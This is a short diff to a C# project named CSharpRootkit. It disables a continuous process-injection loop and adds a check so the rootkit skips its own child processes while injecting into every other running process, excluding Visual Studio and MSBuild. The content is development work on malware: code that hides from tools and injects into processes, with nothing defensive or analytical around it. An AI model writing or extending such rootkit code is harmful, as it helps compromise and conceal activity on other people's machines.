@@ -25,7 +25,7 @@ namespace CSharpRootkit
             RootKitInterface.AddInclusionExclusionProcessName("devenv.exe");
             //Console.ReadLine();
             InjectAllPossible();
-            new Thread(InjectAllPossibleLoop).Start();
+            //new Thread(InjectAllPossibleLoop).Start();
 
             Console.WriteLine("injected all");
             Console.WriteLine("pid, filename, processname, stop");
@@ -77,6 +77,13 @@ namespace CSharpRootkit
                 if (!RootKitInterface.started || proc.Id == NativeMethods.GetCurrentProcessId() || proc.ProcessName.ToLower() == "devenv" || proc.ProcessName.ToLower() == "msbuild") 
                 {
                     proc.Dispose();
+                    continue;
+                }
+
+                uint currentProcId = NativeMethods.GetCurrentProcessId();
+
+                if (!Utils.GetParentProcess(proc.Id, out int parentProc) || (uint)parentProc == currentProcId) //make sure its not a subprocess, for example if c# spawns a conhost, injecting into it can cause a crash.
+                {
                     continue;
                 }
 
